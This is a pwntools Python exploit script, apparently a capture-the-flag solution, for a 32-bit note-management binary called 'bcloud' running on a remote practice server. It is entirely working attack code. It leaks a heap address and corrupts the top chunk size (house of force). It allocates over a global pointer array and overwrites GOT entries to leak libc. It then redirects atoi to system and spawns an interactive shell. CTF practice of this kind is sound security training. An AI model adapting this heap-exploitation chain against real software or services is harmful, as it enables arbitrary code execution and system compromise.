from pwn import *

ld_path = "/home/fanxinli/libc-so/libc-23-32/ld-2.23.so"
libc_path = "/home/fanxinli/libc-so/libc-2.23-32.so"
# p = process([ld_path, "./bcloud"], env={"LD_PRELOAD":libc_path})
# p = process([ld_path, ""])
# p = process("", env={"LD_PRELOAD":libc_path})
# p = process("")
p = remote("node4.buuoj.cn", 29872)

# context.log_level = "debug"

r = lambda : p.recv()
rx = lambda x: p.recv(x)
ru = lambda x: p.recvuntil(x)
rud = lambda x: p.recvuntil(x, drop=True)
s = lambda x: p.send(x)
sl = lambda x: p.sendline(x)
sa = lambda x, y: p.sendafter(x, y)
sla = lambda x, y: p.sendlineafter(x, y)
shell = lambda : p.interactive()


def new(size, con):
    sla("option--->>\n", "1")
    sla("Input the length of the note content:\n", str(size))
    sla("Input the content:\n", con)

def edit(index, con):
    sla("option--->>\n", "3")
    sla("Input the id:\n", str(index))
    sla("Input the new content:\n", con)

def free(index):
    sla("option--->>\n", "4")
    sla("Input the id:\n", str(index))

def syn():
    sla("option--->>\n", "5")


## house of force

# leak heap
name = cyclic(0x40)
sa("Input your name:\n", name)
rud("paaa")
info = u32( rud("!").ljust(4, b"\x00"))
print("leak: ", hex(info))

# chang top_chunk size to -1
org = cyclic(0x40)
host = p32(0xffffffff)
sa("Org:\n", org)
sla("Host:\n", host)

# alloc to heap_arr 
top_chunk = info+0xd0
heap_arr = 0x0804B120

new(heap_arr-top_chunk-2*0x8, "a")  # 0
new(0x20, "a")                      # 1
new(0x20, "a")                      # 2

# leak libc 
pro = ELF("./bcloud")
free_got = pro.got["free"]
puts_plt = pro.plt["puts"]
puts_got = pro.got["puts"]
atoi_got = pro.got["atoi"]

edit(1, p32(puts_got)+p32(free_got)+p32(atoi_got))
edit(1, p32(puts_plt))
free(0)

info = u32(ru("\xf7").ljust(0x4, b"\x00"))
print("leak: ", hex(info))

# count
libc = ELF(libc_path)
base = info-libc.sym["puts"]
print("base: ", hex(base))
system = base+libc.sym["system"]

# attack
edit(2, p32(system))
sla("option--->>\n", "/bin/sh\x00")

shell()


